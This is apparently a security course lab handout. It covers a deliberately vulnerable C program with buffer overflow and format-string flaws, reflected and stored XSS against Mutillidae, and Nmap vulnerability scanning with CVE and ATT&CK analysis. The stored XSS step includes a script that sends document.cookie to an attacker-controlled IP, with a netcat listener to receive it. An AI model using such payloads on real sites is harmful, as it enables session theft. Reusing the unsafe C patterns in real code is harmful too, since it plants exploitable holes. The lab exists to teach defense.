Part 2: Memory Corruption in Native C Applications (50 Points)

This section guides you through analyzing and comparing the behavior of a vulnerable C program compiled with and without modern protections.

🔸 Task 1: Compile the Vulnerable Program and Compare Stack Protection (10 Points)

This task demonstrates the impact of compiler-based security features (stack canaries and executable stack flags) using a buffer overflow vulnerability.

Step 1: Prepare the C Source File

Create a file named vulnerable_code.c and paste the following code:

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>

void buffer_overflow(char *input) {
    char buffer[10];
    strcpy(buffer, input);  // VULNERABLE: No bounds check
    printf("Buffer received: %s\n", buffer);
}

void integer_overflow(char *input) {
    int count = atoi(input);
    int width = sizeof(int);
    int total = count * width;

    int *arr = malloc(total);

    if (!arr) {
        printf("Memory allocation failed.\n");
        return;
    }
    for (int i = 0; i < count; i++) {
        arr[i] = i;
    }

    printf("Allocated array of %d integers.\n", count);
    free(arr);
}

void format_string_vuln(char *input) {
    printf(input);  // VULNERABLE: Format string flaw
    printf("\n");
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <overflow|int|format> <input>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "overflow") == 0) {
        buffer_overflow(argv[2]);
    } else if (strcmp(argv[1], "int") == 0) {
        integer_overflow(argv[2]);
    } else if (strcmp(argv[1], "format") == 0) {
        format_string_vuln(argv[2]);
    } else {
        printf("Unknown option: %s\n", argv[1]);
        return 1;
    }

    return 0;
}

Step 2: Compile Two Versions

A. Without Stack Protection (Vulnerable Binary):

gcc -o vuln_noprotection -fno-stack-protector -z execstack vulnerable_code.c

B. With Stack Protection (Hardened Binary):

gcc -o vuln_protected -fstack-protector -z noexecstack vulnerable_code.c

Step 3: Trigger Buffer Overflow

You will send an input longer than buffer[10]. Try progressively increasing input length.

Example:

./vuln_noprotection overflow AAAAAAAAAAAAAAAA
./vuln_protected overflow AAAAAAAAAAAAAAAA

Alternatively:

perl -e 'print "A"x16' | xargs -I {} ./vuln_noprotection overflow {}

Gradually test with more As (20, 24, 28, etc.) until a segmentation fault or crash is observed.

Step 4: Analyze Behavior

  • On vuln_noprotection:

    • Expect possible segmentation fault or silent crash.
    • The overflow may corrupt the return address.

  • On vuln_protected:

    • Should trigger a runtime error:
      *** stack smashing detected ***: terminated
    • May log details in dmesg:
      dmesg | tail

🔍 Analyze and Respond:

  1. What role do stack canaries play in stopping a buffer overflow?
  2. Why does vuln_protected terminate gracefully while vuln_noprotection crashes?
  3. Does the use of -z execstack make any difference in your tests?
  4. What would happen if shellcode were included in the overflow string?
  5. How could an attacker use this vulnerability if stack protection is off?
  6. why dmesg logs vuln_noprotection segmentation fault, but not the vuln_protected error?

Step 1: Access the vulnerable page

  • Open your browser and navigate to:
    http://<M2-IP>/mutillidae/index.php?page=set-background-color.php

Step 2: Inject a script via the color input field

  • In the "Background Color" input box, enter a JavaScript payload:
    <script>alert('XSS')</script>
  • Alternatively, use a less obvious payload such as:
    <img src="x" onerror="alert('XSS2')">

Step 3: Submit the input

  • Observe whether the script executes (e.g., an alert box appears).

Step 4: View the source

  • Use the browser's "View Page Source" option to inspect how the payload is reflected.
  • Look for:
    • Whether the input is embedded directly into the HTML
    • Whether any sanitization or escaping is applied

🔸 Part B: Stored XSS

Step 1: Access the vulnerable blog input form

  • Navigate to the following URL in your browser:
    http://<M2-IP>/mutillidae/index.php?page=add-to-your-blog.php
  • This page allows users to submit blog comments, which are later rendered to all users.

Step 2: Set up a listener on your Kali machine

  • In a separate terminal window on Kali, set up a listener to capture exfiltrated cookies:
    sudo nc -lvnp 80

Step 3: Submit a stored XSS payload

  • In the blog comment or name field, enter the following payload:
    <script>fetch("http://192.168.10.4/?cookie="+document.cookie)</script>
  • Replace <Kali-IP> with the actual IP address of your Kali machine.

Step 4: Simulate a victim user loading the page

  • Open a private/incognito browser window.
  • Revisit the blog post page to simulate a different user viewing the injected content:
    http://<M2-IP>/mutillidae/index.php?page=view-someones-blog.php
    In Please Choose Author, select Show All, and then click View Blog Entries.

Step 5: Confirm the result

  • If the exploit works, the alert will not pop up, but your Kali terminal should receive a connection with the victim’s cookie string.

Analyze and Respond:

  1. What allowed the script to persist across page loads?
  2. What actions could an attacker perform after stealing a session cookie?
  3. How would the SameSite=Strict cookie attribute prevent this?

Part 4: Vulnerability Scanning and Analysis (50 Points)

Goal: Perform active vulnerability scanning on Metasploitable-2 using Nmap, analyze results by researching CVEs and CWEs, correlate with attacker behavior using the MITRE ATT&CK framework, and propose appropriate mitigation strategies.

🔹 Task 1: Vulnerability Scanning with Nmap (10 Points)

Objective: Use Nmap to identify open ports and known vulnerabilities using service detection and vulnerability scripts.

Instructions:

  1. Perform an initial scan to discover services:

    nmap -sV -p- -T4 [MS2-IP]
    • -sV: Enables service/version detection.
    • -p-: Scans all 65535 TCP ports.
    • -T4: Speeds up the scan moderately.
    • -v: Verbose output

  2. Run vulnerability script scan:

    nmap -sV -v --script vuln [MS2-IP]

  3. Record Results:

    • Save the full output.
    • Capture screenshots of important findings (e.g., FTP, Tomcat, Samba, IRC).
    • Highlight services with known vulnerabilities.

🔹 Task 2: Identify and Analyze Five Vulnerabilities (10 Points)

Objective: Select five vulnerabilities from Nmap results and provide in-depth technical analysis.

For each vulnerability, include:

  1. Service Information:

    • Service name and version (e.g., vsftpd 2.3.4)
    • Port number

  2. CVE Details:

    • CVE ID (e.g., CVE-2011-2523)
    • CVSS severity score (e.g., 9.3 Critical)
    • Vulnerability type (e.g., Backdoor, RCE, Auth Bypass)
    • Description of how the vulnerability works

  3. Exploitability:

    • Is there a known Metasploit or exploit-db module?
    • What privileges does the exploit grant?

  4. Example Exploit Path (if applicable):

    • How could an attacker proceed post-exploitation?
    • What data or control could be gained?

📌 Key Resources:

  • https://cve.mitre.org
  • https://www.exploit-db.com/
  • https://nvd.nist.gov

🔹 Task 3: CWE Classification and Impact Analysis (10 Points)

Objective: For each of the five vulnerabilities, map it to the correct Common Weakness Enumeration (CWE) ID.

Steps:

  1. Identify the relevant CWE ID (e.g., CWE-77: Command Injection, CWE-120: Classic Buffer Overflow).
  2. Visit https://cwe.mitre.org to confirm definitions and typical impacts.
  3. Explain the weakness class and how it contributes to the actual exploit.
  4. Consider general impacts: e.g., data confidentiality loss, privilege escalation, or full system compromise.

🔹 Task 4: MITRE ATT&CK Mapping (10 Points)

Objective: Relate at least two vulnerabilities to ATT&CK tactics and techniques.

Instructions:

For two of your selected vulnerabilities, identify:

  • Tactic (e.g., Initial Access, Privilege Escalation)
  • Technique (e.g., T1190 – Exploit Public-Facing Application)
  • Brief explanation of how an attacker would use this exploit in a real-world campaign.

📌 Use: https://attack.mitre.org/

For each vulnerability:

  1. Recommend at least one technical and one administrative control.

    • Example Technical: Patch the service, disable the vulnerable feature, firewall filtering
    • Example Administrative: Update security policy, restrict network access, enable logging/monitoring

  2. Identify whether the mitigation would be preventive, detective, corrective, or proactive.

Analyze and Respond:

  3. If you were a system admin, what defense-in-depth measures would you deploy for services exposed to the internet?
